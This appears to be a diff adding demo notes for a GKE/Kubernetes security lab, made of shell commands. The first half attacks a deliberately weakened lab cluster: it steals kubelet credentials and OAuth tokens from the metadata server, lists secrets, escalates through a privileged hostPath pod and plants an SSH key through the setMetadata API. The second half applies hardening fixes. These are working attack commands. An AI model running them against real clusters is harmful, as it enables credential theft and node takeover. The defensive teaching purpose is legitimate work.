@@ -1,0 +1,481 @@
+
+# Create instance
+gcloud compute instances create test \
+      --subnet=default --image-project=ubuntu-os-cloud \
+      --image=ubuntu-1604-xenial-v20180612 \
+      --machine-type "custom-1-1024" --zone "europe-west1-d" 
+
+# Connect to instance
+gcloud compute ssh test
+useradd test 
+passwd test
+in /etc/ssh/sshd_config
+PasswordAuthentication yes
+/etc/init.d/ssh restart
+
+# Generate ssh key
+mkdir k8s
+cd k8s
+ssh-keygen -t k8s-test
+
+# Create Kubernetes cluster 
+bash create_cluster.sh   
+# or
+gcloud container clusters create "k8s-cluster"  --zone "europe-west1-d" \
+   --machine-type "custom-1-1024" --image-type "GCI" --disk-size "100" \
+   --network "default" --enable-cloud-logging \
+   --no-enable-cloud-monitoring --enable-autoscaling --min-nodes="2" --max-nodes="3" \
+   --cluster-version=1.8.10-gke.0 --enable-legacy-authorization --enable-network-policy
+
+# Enable --enable-legacy-authorization because Google has disabled recently legacy authorization
+
+# Check version
+kubectl version --short
+# Check RBAC 
+gcloud container clusters list --format='table[[box]](name,legacyAbac.enabled)'
+# Check who is granted the special “cluster-admin” role
+kubectl describe clusterrolebinding cluster-admin
+# Checn network policy
+gcloud container clusters list --format='table[[box]](name,addonsConfig.networkPolicyConfig)'
+kubectl get networkpolicies --all-namespaces
+
+# create container with Ubuntu
+kubectl  create -f nginx.yaml
+#kubectl run my-shell --rm -i --tty --image ubuntu:16.04 -- bash
+# Get pods
+kubectl get pods
+# Connect to pod
+kubectl exec -it CONTAINER-ID bash
+export TERM=xterm
+# For example:
+# kubectl exec -it nginx-66c65c458d-jpdtb bash
+# Install curl netcat nmap net-tools kubectl 
+apt-get update
+apt-get install -y curl netcat nmap net-tools iproute2 less iputils-ping jq vim \
+  python-pip groff-base tcpdump ssh
+curl -sLO https://storage.googleapis.com/kubernetes-release/release/v1.8.4/bin/linux/amd64/kubectl
+chmod +x kubectl
+mv kubectl /bin
+ip a
+For example: 10.8.2.8
+curl -s http://10.8.2.1:8080
+# cAdvisor
+curl -s http://10.8.2.1:4194/docker/
+curl -s http://heapster.kube-system/metrics
+# Kubelet
+curl -s http://10.8.2.1:10255/metrics
+# Kube-proxy
+curl -s http://10.8.2.1:10256
+# Get NODE ip
+kubectl get nodes -o wide
+# In v1.9.7-gke.3
+Error from server (Forbidden): nodes is forbidden: User "system:serviceaccount:default:default" cannot list nodes at the cluster scope: Unknown user "system:serviceaccount:default:default"
+# in GKE
+kubectl describe node NODE-NAME
+curl -sk http://NODE-IP:4194/metrics |less
+# For example:
+curl -sk http://10.8.2.1:4194/metrics |less
+curl -sk http://10.8.2.1:4194/metrics | grep dockerVersion
+curl -sk http://10.8.2.1:4194/metrics | grep running
+# Service token
+ls /var/run/secrets/kubernetes.io/serviceaccount/
+# Hit API Server
+env
+curl -sk https://$KUBERNETES_PORT_443_TCP_ADDR:443
+# In 1.9.7 version
+Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:default:default" cannot list pods in the namespace "default": Unknown user "system:serviceaccount:default:default"
+
+# Use default SA token
+ls -al /var/run/secrets/kubernetes.io/serviceaccount
+cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d"." -f2 | base64 --decode
+kubectl get pods --all-namespaces
+kubectl get secrets --all-namespaces
+kubectl get secrets --all-namespaces | grep default
+kubectl get secret -n kube-system TOKEN-ID -o yaml
+# For example
+# kubectl get secret -n kube-system default-token-ww2zp -o yaml
+# Dashboard
+curl -sk https://kubernetes-dashboard.kube-system
+clear
+ping kubernetes-dashboard.kube-system
+ssh -R8000:DASHBOARD-IP:80 user@host
+# For example
+# ssh -R8000:10.11.242.153:443 user@35.205.120.67
+
+# Create redis server
+kubectl create -f redis.yaml
+# Go to nginx container 
+kubectl get pods -o wide
+kubectl get svc
+nmap -n -T5 -p 6379 -Pn REDIS-SERVICE-IP
+# For example
+# nmap -n -T5 -p 6379 -Pn 10.11.249.62
+# Install redis-cli
+apt install -y redis-tools
+# Connect to Redis
+redis-cli -h 10.11.249.62
+keys *
+set cats 1000
+keys *
+exit
+
+# Get Node IP
+kubectl get nodes -o wide
+kubectl describe node NODE-NAME
+ping -c1 NODE-IP
+# For example:
+ping -c1 10.132.0.3
+curl -sk https://10.132.0.3:10250/
+curl -sk https://10.132.0.3:10250/runningpods/
+curl -sk https://10.132.0.3:10250/runningpods/ > allpods
+vi allpods
+curl -sk https://10.8.1.1:10250/runningpods/
+
+# Calico
+# curl -s http://10.8.2.1:6666/v2/keys
+
+# Show kubelet-exploit worker
+#curl -sk https://172.20.48.188:10250/run/default/azure-vote-front-1874756303-c3s69/azure-vote-front -d "cmd=ls -al /"
+
+# AWS Hit metadata API to get user-data
+#curl -sk http://169.254.169.254/latest/user-data
+#curl -sk http://169.254.169.254/latest/user-data | less
+
+# GKE Metadata
+# Show access to user-data
+curl -s -H "X-Google-Metadata-Request: True" http://metadata.google.internal/0.1/meta-data/attributes/
+
+# Get kube-env
+curl -sLO https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl && chmod +x kubectl && mv kubectl /usr/local/bin && curl -s -H "X-Google-Metadata-Request: True" http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env | sed -e 's/^/export /g' | sed -e 's/: /=/g' | grep -v "EVICTION_HARD" | grep -v "EXTRA_DOCKER_OPTS" > kube-env.sh && . kube-env.sh && echo $KUBELET_KEY | base64 -d > client.pem && echo $KUBELET_CERT | base64 -d > client.crt && echo $CA_CERT | base64 -d > ca.crt && kubectl --certificate-authority=ca.crt --client-key=client.pem --client-certificate=client.crt --server https://$KUBERNETES_MASTER_NAME get pods --all-namespaces
+
+kubectl --certificate-authority=ca.crt --client-key=client.pem --client-certificate=client.crt --server https://$KUBERNETES_MASTER_NAME get pod kubernetes-dashboard-ID -n kube-system -o yaml
+# For example:
+kubectl --certificate-authority=ca.crt --client-key=client.pem --client-certificate=client.crt --server https://$KUBERNETES_MASTER_NAME get pod kubernetes-dashboard-6bb875b5bc-xv8fg -n kube-system -o yaml
+
+# Get token
+kubectl get secrets --namespace=kube-system
+
+kubectl --certificate-authority=ca.crt --client-key=client.pem --client-certificate=client.crt --server https://$KUBERNETES_MASTER_NAME get secret default-token-ID -o yaml -n kube-system
+# For example:
+kubectl --certificate-authority=ca.crt --client-key=client.pem --client-certificate=client.crt --server https://$KUBERNETES_MASTER_NAME get secret default-token-gmw4x -o yaml -n kube-system
+
+# Run privileged pod
+cat > masterpod.yml << EOF
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: nginx2
+  namespace: kube-system
+spec:
+  hostNetwork: true
+  containers:
+  - name: nginx2
+    image: nginx
+    securityContext:
+      privileged: true
+    volumeMounts:
+      - name: rootfs
+        mountPath: /rootfs
+  volumes:
+    - name: rootfs
+      hostPath:
+        path: /
+EOF
+
+# Get PodSecurityContext
+kubectl get psp --all-namespaces
+
+# Gain node access
+kubectl --certificate-authority=ca.crt --client-key=client.pem --client-certificate=client.crt --server https://$KUBERNETES_MASTER_NAME apply -f masterpod.yml
+
+kubectl --certificate-authority=ca.crt --client-key=client.pem --client-certificate=client.crt --server https://$KUBERNETES_MASTER_NAME exec -it nginx2 -n kube-system /bin/bash
+apt-get update
+apt-get install procps -y
+id
+mount
+cd /rootfs/
+ls 
+cat /rootfs/etc/kubernetes/manifests/kube-proxy.manifest
+cat /rootfs/etc/passwd 
+exit
+
+# Open another console and connect to your pod
+kubectl get pods
+kubectl exec -it NGNIX-ID bash
+kubectl --certificate-authority=ca.crt --client-key=client.pem --client-certificate=client.crt --server https://$KUBERNETES_MASTER_NAME get pod nginx2 -n kube-system
+kubectl --certificate-authority=ca.crt --client-key=client.pem --client-certificate=client.crt --server https://$KUBERNETES_MASTER_NAME get po nginx2 -n kube-system -o json
+# OR
+in console
+kubectl get pod nginx2 -n kube-system
+kubectl get pod nginx2 -n kube-system -o json
+
+# Show meta-data credentials
+curl -s -H "X-Google-Metadata-Request: True" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# Get instance IP
+curl -s -H "X-Google-Metadata-Request: True" http://metadata.google.internal/0.1/meta-data/network
+
+# Get project-id
+curl -s -H "X-Google-Metadata-Request: True" http://metadata.google.internal/0.1/meta-data/project-id
+
+# Get zone-id
+curl -s -H "X-Google-Metadata-Request: True" http://metadata.google.internal/0.1/meta-data/zone
+
+curl -s -H "Metadata-Flavor: Google" -H "Authorization":"Bearer $(curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | awk -F\" '{print $4}')" -H "Accept: application/json" https://www.googleapis.com/compute/v1/projects/kops-175209/zones/europe-west1-d/instances
+
+# For example:
+# curl -s -H "Metadata-Flavor: Google" -H "Authorization":"Bearer $(curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | awk -F\" '{print $4}')" -H "Accept: application/json" https://www.googleapis.com/compute/v1/projects/gkek8s-178117/zones/us-east1-b/instances
+
+# get nodes
+kubectl get nodes
+
+curl -s -H "Metadata-Flavor: Google" -H "Authorization":"Bearer $(curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | awk -F\" '{print $4}')" -H "Accept: application/json" https://www.googleapis.com/compute/v1/projects/kops-175209/zones/europe-west1-d/instances/gke-k8s-cluster-default-pool-02ad561f-qsbj | less
+
+# For example:
+# curl -s -H "Metadata-Flavor: Google" -H "Authorization":"Bearer $(curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | awk -F\" '{print $4}')" -H "Accept: application/json" https://www.googleapis.com/compute/v1/projects/gkek8s-178117/zones/us-east1-b/instances/gke-gke-1-7-8-gce-default-pool-77395b66-cncc | less
+
+export FINGERPRINT=$(curl -s -H "Metadata-Flavor: Google" -H "Authorization":"Bearer $(curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | awk -F\" '{print $4}')" -H "Accept: application/json" https://www.googleapis.com/compute/v1/projects/kops-175209/zones/europe-west1-d/instances/gke-k8s-cluster-default-pool-02ad561f-qsbj | grep finger | tail -1 | cut -d'"' -f4)
+
+# For example:
+# export FINGERPRINT=$(curl -s -H "Metadata-Flavor: Google" -H "Authorization":"Bearer $(curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | awk -F\" '{print $4}')" -H "Accept: application/json" https://www.googleapis.com/compute/v1/projects/gkek8s-178117/zones/us-east1-b/instances/gke-gke-1-7-8-gce-default-pool-77395b66-cncc | grep finger | tail -1 | cut -d'"' -f4)
+
+# Add our ssh-key in metadata
+cat > metadata << EOF
+{ 
+  "fingerprint": "$FINGERPRINT",
+  "items": [
+   {
+    "key": "sshKeys",
+    "value": "geese:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCstgpO3rF8cCz+sI8w2CkUra7xq7GZO1m2XaiDnZEyRbRdW0zEUrOctoag8SX1zp1QfRdQaYD6S4Y7wGhzmmoJte9tR2HBtFAJFjiMWqfJsjhY+1T2zu1mzItxYgVUOoE0LmHCDcvusvzokKOsyDKplz0nFDeIRhS/TkPRBdSq3Juna51Emss/CCOGGxsHmwSZAvHx3vybkVt+7FeGF+Wyq5Z/Q7cFYZ5wyK3Tg5qHV8yXGvoDP7PA/SA1E3R8hT9lceNIQZYPKE5ncHbmNsBG2PygoN52bsgyV+SL9tNgW9QlNeS0rXHhKnq2H4fvHEUdPSEYGUse3QJgSvmibLrf"
+   }
+  ]
+}
+EOF
+
+# Add SSH to node
+curl -X POST -d "@metadata" -s -H "Metadata-Flavor: Google" -H "Authorization":"Bearer $(curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | awk -F\" '{print $4}')" -H "Content-type: application/json" https://www.googleapis.com/compute/v1/projects/kops-175209/zones/europe-west1-d/instances/gke-k8s-cluster-default-pool-02ad561f-qsbj/setMetadata
+
+# Get node External-IP 
+kubectl describe nodes gke-k8s-cluster-default-pool-02ad561f-qsbj |grep ExternalIP
+
+# exit and SSH to node
+ssh -i ~/.ssh/kube.pem geese@EXTERNAL-IP
+
+# Fix GCE Metadata
+
+kubectl create -f gce-metadata-cf.yml
+kubectl create -f gce-metadata-proxy.yml
+
+# Connect into container and check
+# Metadata
+curl -s -H "X-Google-Metadata-Request: True" http://metadata.google.internal/0.1/meta-data/attributes/kube-env
+
+# Delete cluster
+bash delete_cluster.sh
+
+---
+# Audit cluster
+git clone https://github.com/bgeesaman/kubeatf.git
+cd kubeatf
+chmod +x kubeatf
+./kubeatf docker-build
+
+./kubeatf audit-cluster gke-1.7.8-gce | less
+
+---
+
+
+# Get current project 
+gcloud config get-value project
+
+# Use least privilege service accounts for your nodes
+gcloud iam service-accounts create [SA_NAME] \
+    --display-name=[SA_NAME]
+
+# Example
+gcloud iam service-accounts create kubernetes-security-sa \
+    --display-name=kubernetes-sa
+
+gcloud projects add-iam-policy-binding [PROJECT_ID] \
+    --member "serviceAccount:[SA_NAME]@[PROJECT_ID].iam.gserviceaccount.com" \
+    --role roles/logging.logWriter
+
+gcloud projects add-iam-policy-binding [PROJECT_ID] \
+    --member "serviceAccount:[SA_NAME]@[PROJECT_ID].iam.gserviceaccount.com" \
+    --role roles/monitoring.metricWriter
+
+gcloud projects add-iam-policy-binding [PROJECT_ID] \
+    --member "serviceAccount:[SA_NAME]@[PROJECT_ID].iam.gserviceaccount.com" \
+    --role roles/monitoring.viewer
+
+gcloud projects add-iam-policy-binding [PROJECT_ID] \
+  --member "serviceAccount:[SA_NAME]@[PROJECT_ID].iam.gserviceaccount.com" \
+  --role roles/storage.objectViewer
+
+# If your cluster already exists, you can now create a new node pool with this new service account:
+gcloud container node-pools create [NODE_POOL] \
+  --service-account=[SA_NAME]@[PROJECT_ID].iam.gserviceaccount.com" \
+  --cluster=[CLUSTER_NAME]
+
+# Reduce your node service account scopes
+gcloud container clusters create [CLUSTER_NAME] \
+    --scopes=[CUSTOM_SCOPES]
+# https://developers.google.com/identity/protocols/googlescopes
+
+# Protect metadata
+gcloud config set container/use_v1_api false
+export NODE_SA_NAME=gke-node-sa
+gcloud iam service-accounts create $NODE_SA_NAME \
+  --display-name "Node Service Account"
+export NODE_SA_EMAIL=`gcloud iam service-accounts list --format='value(email)' \
+  --filter='displayName:Node Service Account'`
+
+export PROJECT=`gcloud config get-value project`
+
+gcloud projects add-iam-policy-binding $PROJECT \
+  --member serviceAccount:$NODE_SA_EMAIL \
+  --role roles/monitoring.metricWriter
+gcloud projects add-iam-policy-binding $PROJECT \
+  --member serviceAccount:$NODE_SA_EMAIL \
+  --role roles/monitoring.viewer
+gcloud projects add-iam-policy-binding $PROJECT \
+  --member serviceAccount:$NODE_SA_EMAIL \
+  --role roles/logging.logWriter
+
+gcloud projects add-iam-policy-binding $PROJECT \
+  --member serviceAccount:$NODE_SA_EMAIL \
+  --role roles/storage.objectViewer
+
+# Beginning with Kubernetes version 1.9.3, you can enable metadata concealment to prevent user Pods from accessing certain VM metadata for your cluster's nodes, such as Kubelet credentials and VM instance information. Specifically, metadata concealment protects access to kube-env (which contains Kubelet credentials) and the VM's instance identity token.
+# --workload-metadata-from-node=SECURE
+
+# Disable Attribute-Based Access Control (ABAC), and instead use Role-Based Access Control (RBAC) in Kubernetes Engine. Enable Netowrk policy and Protect metadata
+gcloud beta container clusters create "k8s-cluster"  --zone "europe-west1-d" \
+   --machine-type "custom-1-1024" --image-type "GCI" --disk-size "100" \
+   --network "default" --enable-cloud-logging \
+   --no-enable-cloud-monitoring --enable-autoscaling --min-nodes="2" --max-nodes="3" \
+   --no-enable-legacy-authorization \
+   --enable-network-policy --workload-metadata-from-node=SECURE \
+   --enable-pod-security-policy
+
+# create container with Ubuntu
+kubectl  create -f nginx.yaml
+# Get pods
+kubectl get pods
+# Connect to pod
+kubectl exec -it CONTAINER-ID bash
+
+apt-get update
+apt-get install -y curl netcat nmap net-tools iproute2 less iputils-ping jq vim \
+  python-pip groff-base tcpdump ssh
+curl -sLO https://storage.googleapis.com/kubernetes-release/release/v1.8.4/bin/linux/amd64/kubectl
+chmod +x kubectl
+mv kubectl /bin
+
+kubectl get pods
+
+
+# Checking
+curl -H "Metadata-Flavor: Google" \
+'http://metadata/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://www.example.com'
+
+# Show meta-data credentials
+curl -s -H "X-Google-Metadata-Request: True" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# Get instance IP
+curl -s -H "X-Google-Metadata-Request: True" http://metadata.google.internal/0.1/meta-data/network
+
+# Get project-id
+curl -s -H "X-Google-Metadata-Request: True" http://metadata.google.internal/0.1/meta-data/project-id
+
+# Get zone-id
+curl -s -H "X-Google-Metadata-Request: True" http://metadata.google.internal/0.1/meta-data/zone
+
+# Get zone
+curl -s -H "X-Google-Metadata-Request: True" http://metadata.google.internal/0.1/meta-data/zone
+
+curl -s -H "Metadata-Flavor: Google" -H "Authorization":"Bearer $(curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | awk -F\" '{print $4}')" -H "Accept: application/json" https://www.googleapis.com/compute/v1/projects/kops-175209/zones/europe-west1-d/instances
+
+# Get kube-env
+curl -s -H "X-Google-Metadata-Request: True" http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
+
+# Configuring Authorized Networks for Master Access in GKE
+--enable-master-authorized-networks \
+--master-authorized-networks 8.8.8.8/32,8.8.8.0/24
+
+# Create cluster with authorized networks
+gcloud beta container clusters create "k8s-cluster"  --zone "europe-west1-d" \
+   --machine-type "custom-1-1024" --image-type "GCI" --disk-size "100" \
+   --network "default" --enable-cloud-logging \
+   --no-enable-cloud-monitoring --enable-autoscaling --min-nodes="2" --max-nodes="3" \
+   --no-enable-legacy-authorization \
+   --enable-network-policy --workload-metadata-from-node=SECURE \
+   --enable-pod-security-policy \
+   --enable-master-authorized-networks \
+   --master-authorized-networks 8.8.8.8/32,8.8.8.0/24
+
+# Disable dashboard
+# The Kubernetes Web UI (Dashboard) is backed by a highly privileged Kubernetes Service Account
+gcloud container clusters update "k8s-cluster" \
+    --zone "europe-west1-d" \
+    --update-addons=KubernetesDashboard=DISABLED 
+
+# Pod Security Policy 
+# By default, pods in Kubernetes can operate with capabilities beyond what they require. You should constrain the pod's capabilities to only those required for that workload.
+kubectl create -f psp-non-root.yml
+# Or
+kubectl create -f- <<EOF
+apiVersion: extensions/v1beta1
+kind: PodSecurityPolicy
+metadata:
+  name: psp-non-root
+spec:
+  privileged: false  # Prevents creation of privileged Pods
+  allowPrivilegeEscalation: false # Required to prevent escalations to root.
+  seLinux:
+    rule: RunAsAny
+  supplementalGroups:
+    rule: RunAsAny
+  runAsUser:
+    rule: RunAsAny
+  fsGroup:
+    rule: RunAsAny
+  volumes:
+  - '*'
+EOF
+
+### Create Pod Security Policy ###
+kubectl create -f psp-non-root.yml
+# RBAC
+kubectl create clusterrolebinding your-user-cluster-admin-binding --clusterrole=cluster-admin --user=stas.kolenkin@gmail.com
+# Create namespaces
+kubectl create namespace psp-test
+kubectl create serviceaccount -n psp-test fake-test
+kubectl create -f my-clusterrole.yaml
+kubectl create -f my-rolebinding.yaml
+# kubectl create rolebinding -n psp-test fake-editor --clusterrole=edit --serviceaccount=psp-test:fake-test
+kubectl --as=system:serviceaccount:psp-test:fake-test -n psp-test get pods
+# Get Pod Security Policy
+kubectl get psp
+kubectl describe psp 00-psp-non-root
+# Disable privileged by default
+# kubectl edit psp gce.privileged 
+# Create master pod
+kubectl create -f masterpod.yml
+kubecrl get pods
+# Check
+kubectl get pods 
+# Connect to pod
+kubectl exec -it nginx2 bash
+df -h
+kubectl delete -f masterpod.yml
+kubectl --as=system:serviceaccount:psp-test:fake-test -n psp-test create -f masterpod.yml
+kubectl --as=system:serviceaccount:psp-test:fake-test -n psp-test create -f nginx.yaml
+kubectl get pods
+
+
+# Delete instance
+gcloud compute instances delete test --zone "europe-west1-d"
+# Delete cluster
+bash delete_cluster.sh
